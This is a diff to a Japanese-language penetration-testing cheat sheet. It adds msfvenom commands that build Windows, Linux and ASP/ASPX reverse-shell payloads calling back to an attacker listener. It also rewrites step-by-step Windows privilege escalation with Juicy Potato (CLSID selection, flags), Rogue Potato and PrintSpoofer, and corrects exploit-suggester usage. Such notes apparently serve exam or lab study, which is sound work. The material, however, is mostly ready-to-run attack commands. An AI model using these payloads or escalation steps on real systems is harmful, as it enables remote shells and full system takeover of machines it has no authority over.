@@ -1040,7 +1040,7 @@ lient.Close()"
   
 ### Windows
 ```
-msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 –f exe > reverse.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o reverse.exe
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o reverse.exe
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
 ```
@@ -1048,6 +1048,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=t
 ### Linux
 ```
 msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.16.4 LPORT=443 -f python
+msfvenom -p linux/x86/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
 ```
@@ -1057,8 +1058,9 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -
 msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Number> -f raw > reverse.php
 ```
 
-### ASP
+### asp/aspx
 ```
+msfvenom -p windows/shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f aspx > reverse.aspx
@@ -2362,18 +2364,16 @@ oLink.Save
 cscript shortcut.vbs
 ```
 
-## Token Impersonation - Rogue Potato
-socatリダイレクタを設定して、kaliの135番ポートをWindowsの9999に転送する。
+## Token Impersonation - Juicy Potato
 ```
-sudo socat tcp-listen:135,reuseaddr,fork tcp:<Target IP>:9999
+Tips: ポテトアタックの歴史
+WindowsのサービスアカウントからNT AUTHORITY/SYSTEMに特権を昇格させるために使われるポテトには、多くの種類がある。
+Hot、Rotten、Lonely、Juicy、Rogueは、ポテトエクスプロイトのファミリーです。
+すべてのポテトアタックには独自の制限があります。
+攻撃対象のマシンが >= Windows 10 1809 & Windows Server 2019 の場合 - Rogue Potato を試してみてください。
+攻撃対象のマシンが < Windows 10 1809 < Windows Server 2019 の場合 - Juicy Potato を試してみてください。
 ```
-次にnetcatでlistenしておき、管理者ユーザーとしてRDPにログインし、管理者コマンドプロンプトを起動する。(右クリックして管理者として実行)  
-PSEexec64.exeを使用してlocal serviceアカウントを取得する。
-```
-PSExec64.exe -i -u "nt authority\local service" C:\Windows\Temp\reverse.exe
-```
-上記で得られたシェルでwhoami /privコマンドを使用すると下記のような結果を得られる。  
-この時、いずれかの権限を持っている場合にRouge Potatoのエクスプロイトが機能する。
+「whoami /priv」コマンドを使用して、いずれかの権限を持っており「攻撃対象のマシンが < Windows 10 1809 < Windows Server 2019 の場合」にJuicy Potatoのエクスプロイトが機能する可能性がある。  
 - SeImpersonatePrivilege
 - SeAssignPrimaryTokenPrivilege
 
@@ -2397,29 +2397,39 @@ SeCreateGlobalPrivilege       Create global objects                     Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 SeTimeZonePrivilege           Change the time zone                      Disabled
 ```
-次に、もう一度別のターミナルで、netcatをlistenにしておく。  
-最後にlocal serviceのreverse shellが返ってきているシェルでRoguePotatoエクスプロイトを実行して、SYTEM権限のシェルを取得する。
+
 ```
-RoguePotato.exe -r <Local IP> -e "C:\Windows\Temp\reverse.exe" -l 9999
+JuicyPotato.exe -l 9000 -p C:\Windows\Temp\shell.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+```
+- -l...COMサーバのlisten port(競合しているポートでなければどのポートでも機能はする)
+- -p...使用するペイロードの選択(事前に転送しているペイロードなど)
+- -t...createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
+- -c...CLSID(default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
+
+CLSIDは、./juicy-potato/CLSID/から対応するOSを選択してUserが NT AUTHORITY\SYSTEMになっているものを指定する。  
+もしくは、./juicy-potato/CLSID/GetCLSID.ps1を利用してCLSIDを取得する。  
+powershellが何かの理由により使用できない場合、JuicyPotato.exe(test_clsid.batの内容に合わせるためjuicypotato.exeに名前を変更)と./juicy-potato/CLSID/<対応するOS>/CLSID.list/、./juicy-potato/Test/test_clsid.batをターゲットマシンに配置してCLSIDを集める。  
+ターゲット端末でtest_clsid.batを5分間起動してから、出力されたresult.logを確認してCLSIDを取得する。  
+
+juicy-potato(x64):  
+https://github.com/ohpe/juicy-potato.git  
+juicy-potato(x86バイナリ):  
+https://github.com/ivanitlearning/Juicy-Potato-x86.git
+
+
+## Token Impersonation - Rogue Potato
+「whoami /priv」コマンドを使用して、いずれかの権限を持っており「攻撃対象のマシンが >= Windows 10 1809 & Windows Server 2019 の場合」にRouge Potatoのエクスプロイトが機能する可能性がある。  
+- SeImpersonatePrivilege
+- SeAssignPrimaryTokenPrivilege
+
+```
+RoguePotato.exe -r <Local IP> -e "C:\Windows\Temp\reverse.exe" -l <Local Port>
 ```
 - -r...リモートIPアドレス(攻撃者端末のIP)
 - -e...reverse shellペイロードのパス
-- -l...リスニングポート
+- -l...リスニングポート(攻撃者端末の待ち受けポート)
 
-```
-Tips: ポテトアタックの歴史
-WindowsのサービスアカウントからNT AUTHORITY/SYSTEMに特権を昇格させるために使われるポテトには、多くの種類がある。
-Hot、Rotten、Lonely、Juicy、Rogueは、ポテトエクスプロイトのファミリーです。
-すべてのポテトアタックには独自の制限があります。
-攻撃対象のマシンが >= Windows 10 1809 & Windows Server 2019 の場合 - Rogue Potato を試してみてください。
-攻撃対象のマシンが < Windows 10 1809 < Windows Server 2019 の場合 - Juicy Potato を試してみてください。
-```
 ## Token Impersonation - PrintSpoofer
-まずは、netcatでlistenしておき管理者ユーザーとしてRDPにログインし、管理者コマンドプロンプトを起動する。(右クリックして管理者として実行)  
-PSEexec64.exeを使用してlocal serviceアカウントを取得する。
-```
-PSExec64.exe -i -u "nt authority\local service" C:\Windows\Temp\reverse.exe
-```
 上記で得られたシェルでwhoami /privコマンドを使用すると下記のような結果を得られる。  
 この時、いずれかの権限を持っている場合にRouge Potatoのエクスプロイトが機能する。
 - SeImpersonatePrivilege
@@ -2458,7 +2468,7 @@ pip install xlrd
 ```
 ```
 systeminfo > systeminfo.txt
-./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
+./windows-exploit-suggester.py -database 2020-06-08-mssb.xls -systeminfo systeminfo.txt
 ```
 ### Windows-kernel-exploits
 コンパイル済みのカーネルエクスプロイト用バイナリが用意されている。  
